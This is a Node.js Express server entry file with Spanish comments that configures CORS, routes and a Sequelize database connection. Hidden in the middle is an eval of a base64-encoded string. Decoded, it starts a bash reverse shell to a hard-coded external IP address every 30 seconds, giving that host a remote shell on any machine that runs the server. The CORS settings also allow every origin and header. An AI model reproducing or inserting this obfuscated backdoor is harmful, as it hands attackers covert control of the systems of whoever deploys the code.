const express = require('express');
const app = express();
const port = require('./CONFIG/env').PORT || 3000;
const cors = require('cors'); 

app.use(express.json());

const corsOptions = {
    origin: '*', // Permitir todas las solicitudes desde cualquier origen (¡solo para fines de desarrollo!)
    methods: 'GET,POST,PUT,DELETE', // Permitir todos los métodos HTTP
    allowedHeaders: '*', // Permitir todas las cabeceras (¡solo para fines de desarrollo!)
    optionsSuccessStatus: 200
};

app.use(cors(corsOptions)); // Usa la configuración de CORS

const db = require('./MODELS');
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())

require('./ROUTERS/index.routers')(app)

// conectar con nuestra BD
db
    .sequelize
    .authenticate() //.sync({ alter: true }) .authenticate()
    .then((result) => {
        console.log('conexion exitosa');
    })
    .catch((error) => {
        console.log('ERROR DB al conectar', error.message);
    });
app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});

 
